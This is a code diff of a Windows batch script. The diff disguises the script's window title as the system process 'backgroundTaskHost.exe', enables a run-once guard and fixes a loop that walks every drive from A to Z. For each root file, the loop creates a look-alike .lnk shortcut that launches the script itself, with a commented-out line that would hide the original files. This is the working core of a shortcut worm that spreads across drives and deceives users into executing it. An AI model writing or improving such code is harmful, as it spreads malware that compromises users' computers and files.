@@ -34,11 +34,12 @@
 ::978f952a14a936cc963da21a135fa983
 @echo off
 chcp 65001>nul
+title backgroundTaskHost.exe [MikronT]
 
 
 
-rem if "%runKey%" == "already_runned" exit
-rem set runKey=already_runned
+if "%runKey%" == "already_runned" exit
+set runKey=already_runned
 
 echo.%*
 pause
@@ -68,7 +69,7 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
         for /f "delims=" %%x in ('dir "%%i:\*" /a:-d /b 2^>nul') do (
           if "%%x" NEQ "desktop.ini" if "%%x" NEQ "pagefile.sys" if "%%x" NEQ "Thumbs.db" (
             rem attrib +h "%%i:\%%x"
-            if not exist "%%i:\%%x" (
+            if not exist "%%i:\%%x.lnk" (
               shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
               rem >nul timeout /nobreak /t 1
             )
